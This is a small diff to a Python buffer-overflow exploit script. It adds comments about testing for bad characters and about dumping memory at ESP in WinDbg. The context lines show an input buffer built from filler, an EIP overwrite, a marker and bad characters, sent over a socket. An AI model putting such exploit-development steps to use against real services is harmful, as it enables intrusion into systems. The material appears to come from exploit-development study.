@@ -1,3 +1,4 @@
+#Testing for bad chars
 import socket
 
 # Target details
@@ -33,3 +34,4 @@ inputBuffer = filler + eip + marker + badchars
 
 # --- Fire it off ---
 send_payload(inputBuffer)
+#If using  winDbg ,use cmd; db esp, to dump the memory address to see any bad chars if any
